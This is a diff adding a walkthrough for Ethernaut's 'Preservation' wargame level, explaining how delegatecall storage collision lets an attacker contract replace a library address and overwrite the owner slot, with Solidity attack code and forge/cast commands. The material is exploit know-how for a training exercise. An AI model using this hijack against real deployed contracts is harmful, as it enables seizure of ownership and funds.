@@ -567,3 +567,47 @@ cast send $LEVEL_ADDRESS "transferFrom(address from, address to, uint256 amount)
 ```
 
 5. submit the instance, u're done.
+
+## level16 - Preservation
+
+1. this level needs a good understanding of how delegatecall works, for example there're two contracts A and B, When contract A executes delegatecall to contract B, B's code is executed with contract A's storage, msg.sender and msg.value.
+
+2. in our scenario Preservation is contract A and LibraryContract is contarct B means when setFirstTime() makes delegatecall to timeZone1Library, it is modifying storage slot 0 in Preservation.
+
+3. so what we'll do is change the value at timeZone1Library with our malicious contract and we can then create a spoof function for "setTime(uint256)" and change the owner.
+ 
+4. source code
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract AttackPreservation {
+    uint256 slot0;
+    uint256 slot1;
+    uint256 slot2;
+
+    // set slot3 to our address
+    function setTime(uint256 owner) public {
+        slot2 = owner;
+    }
+}
+```
+deploy the contract 
+```
+forge create src/level16t.sol:AttackPreservation --rpc-url $RPC_URL --private-key $PKEY
+```
+5. then we'll call setFirstTime() with our malicious contract so that timeZone1Library points to our contract
+```
+cast send $LEVEL_ADDRESS "setFirstTime(uint256 _timeStamp)" $DEPLOYED_ADDRESS --rpc-url $RPC_URL --private-key $PKEY
+```
+6. now the contract will use implementation of "setTime(uint256)" mentioned in malicious contract, in the original contract slot2 points to owner, so we'll make changes to slot2 thru malicious contract
+```
+cast send $LEVEL_ADDRESS "setFirstTime(uint256 _timeStamp)" $PLAYER_ADDRESS --gas-limit 60000 --rpc-url $RPC_URL --private-key $PKEY
+```
+we need to set gas limit manually as default value is insufficient
+
+7. u can inspect storage slot 2 to check if owner is successfully updated or not
+```
+cast storage 0xC02392A9BcD2dd1Aea41E0f0AB46f09C4eAb1612 2 --rpc-url $RPC_URL
+```
+8. after confirmation u can submit the instance.
